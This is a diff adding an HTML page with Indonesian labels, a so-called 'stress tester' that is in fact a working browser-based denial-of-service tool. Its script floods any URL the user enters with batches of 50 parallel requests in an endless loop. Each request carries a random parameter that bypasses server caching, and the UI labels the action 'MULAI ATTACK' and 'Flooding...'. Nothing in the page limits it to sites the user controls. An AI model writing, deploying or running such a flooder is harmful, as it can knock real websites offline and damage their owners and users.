@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>Uji Pertahanan Web (Aggressive)</title>
+    <style>
+        body { font-family: 'Courier New', Courier, monospace; background: #1a1a1a; color: #00ff00; padding: 20px; text-align: center; }
+        .box { border: 2px solid #00ff00; padding: 20px; border-radius: 10px; max-width: 400px; margin: auto; }
+        input { width: 90%; padding: 10px; margin-bottom: 10px; background: #000; border: 1px solid #00ff00; color: #00ff00; }
+        button { background: #00ff00; color: #000; padding: 10px 20px; border: none; cursor: pointer; font-weight: bold; width: 100%; }
+        #counter { font-size: 2em; margin: 20px 0; }
+        .warning { color: yellow; font-size: 12px; margin-top: 10px; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h3>STRESS TESTER v2.0</h3>
+    <input type="text" id="target" placeholder="https://web-kamu.com">
+    <button id="btn" onclick="toggle()">MULAI ATTACK</button>
+    <div id="counter">0</div>
+    <div id="status">Status: Standby</div>
+    <p class="warning">Peringatan: HP mungkin akan panas dan lag.</p>
+</div>
+
+<script>
+    let active = false;
+    let count = 0;
+
+    async function flood(url) {
+        while (active) {
+            // Mengirim 50 request sekaligus secara paralel dalam satu loop
+            const requests = [];
+            for (let i = 0; i < 50; i++) {
+                // Menambahkan parameter acak agar tidak terkena Cache Server
+                const bypassUrl = url + "?t=" + Math.random(); 
+                requests.push(fetch(bypassUrl, { mode: 'no-cors', cache: 'no-store' }));
+            }
+            
+            count += 50;
+            document.getElementById('counter').innerText = count;
+
+            // Menunggu batch ini selesai sebentar agar browser tidak langsung crash
+            await Promise.allSettled(requests);
+        }
+    }
+
+    function toggle() {
+        const url = document.getElementById('target').value;
+        const btn = document.getElementById('btn');
+        if (!url.startsWith('http')) return alert("Gunakan http:// atau https://");
+
+        active = !active;
+        if (active) {
+            btn.innerText = "STOP";
+            btn.style.background = "red";
+            document.getElementById('status').innerText = "Status: Flooding...";
+            flood(url);
+        } else {
+            btn.innerText = "MULAI ATTACK";
+            btn.style.background = "#00ff00";
+            document.getElementById('status').innerText = "Status: Berhenti";
+        }
+    }
+</script>
+</body>
+</html>
+
